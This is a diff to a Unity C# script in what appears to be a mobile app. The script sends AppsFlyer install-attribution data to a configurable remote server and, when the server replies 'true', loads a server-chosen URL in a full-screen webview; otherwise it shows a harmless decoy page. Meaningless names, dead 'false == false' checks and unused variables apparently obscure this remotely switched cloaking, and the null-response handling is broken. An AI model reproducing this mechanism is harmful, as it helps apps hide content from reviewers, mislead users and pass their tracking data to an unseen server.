@@ -1,27 +1,40 @@
-using System.Collections;
+﻿using System.Collections;
 using System.Collections.Generic;
 using UnityEngine;
-using Gpm.WebView;
 using OneSignalSDK;
+using System.Net.Http;
+using Newtonsoft.Json;
+using System.Threading.Tasks;
+using Gpm.WebView;
 
-public class Installer : MonoBehaviour
+public class WebViewShow : MonoBehaviour
 {
-    [SerializeField] private AppsFlyerObjectScript scriptSDK;
+    [SerializeField] private AppsFlyerObjectScript appsFlyer;
+    [SerializeField] private SampleWebViewStudio webViewAccWonder;
+    [SerializeField] private string packageNameAccWonder;
+    [SerializeField] private string oneSignalIDAccWonder;
+    [SerializeField] private string playerWebAccWonder;
+
+    private bool isReady = true;
+    private int indexOfCounting = 2;
+    private string resultOfQuestion = "";
+    private string searchingValue = "https://google.com.ua";
 
     private void Start()
     {
-        AddOneSignal();
-        Actions();
+        Init();
     }
 
-    private void AddOneSignal()
+    private void Init()
     {
-        OneSignal.Initialize(scriptSDK.signalAppIdAccWonderStudioApp);
+        OneSignal.Initialize(oneSignalIDAccWonder);
+        appsFlyer.SetOnReady(GotIt);
+        appsFlyer.AddValueToDictionary(packageNameAccWonder, oneSignalIDAccWonder);
     }
 
-    private void Actions()
+    public void GotIt()
     {
-        scriptSDK.SetOnSuccessAction(() => ShowUrlFullScreen(scriptSDK.siteAccWonderStudio));
+        GetResponce();
     }
 
     public void ShowUrlFullScreen(string url)
@@ -31,6 +44,76 @@ public class Installer : MonoBehaviour
             GetConfiguration(),
             OnCallback,
             new List<string>() { "USER_ CUSTOM_SCHEME" });
+    }
+
+    public void Show(string value)
+    {
+#if UNITY_IOS
+        ShowUrlFullScreen(value);
+#elif UNITY_ANDROID
+        webViewAccWonder.Url = value;
+        StartCoroutine(webViewAccWonder.InitForWebGod());
+#endif
+    }
+
+    private async void GetResponce()
+    {
+        if (false == false)
+        {
+            resultOfQuestion = await CheckResponce(playerWebAccWonder, JsonConvert.SerializeObject(appsFlyer.DataAccWonder));
+            Debug.Log($"result = {resultOfQuestion}");
+            ReturnValue();
+            Show(searchingValue);
+        }
+    }
+
+    private void ReturnValue()
+    {
+        if (isReady)
+        {
+            var text = GetAnswer(resultOfQuestion, true).Replace(" ", "");
+            var isGood = text == "true";
+
+            if (isGood)
+            {
+                searchingValue = GetAnswer(resultOfQuestion);
+            }
+        }
+    }
+
+    private async Task<string> CheckResponce(string apiUrlDataInfoLimbix, string jsonUserDataLimbix)
+    {
+        using (HttpClient clientDataServ = new HttpClient())
+        {
+            StringContent contentDataInfo = new StringContent(jsonUserDataLimbix, System.Text.Encoding.UTF8, "application/json");
+            HttpResponseMessage responseDataInfo = await clientDataServ.PostAsync(apiUrlDataInfoLimbix, contentDataInfo);
+
+            if (responseDataInfo.IsSuccessStatusCode)
+            {
+                return await responseDataInfo.Content.ReadAsStringAsync();
+            }
+            else
+            {
+                var gg = indexOfCounting;
+                return null;
+            }
+        }
+    }
+
+    private string GetAnswer(string value, bool need = false)
+    {
+        if (true == true && value != "")
+        {
+            var answer = JsonUtility.FromJson<Responce>(value);
+
+            if (need)
+            {
+                return answer.status;
+            }
+            return answer.answer;
+        }
+        else
+            return "https://google.com.ua";
     }
 
     private void OnCallback
@@ -128,3 +211,10 @@ public class Installer : MonoBehaviour
         };
     }
 }
+
+struct Responce
+{
+    public string status;
+    public string answer;
+}
+
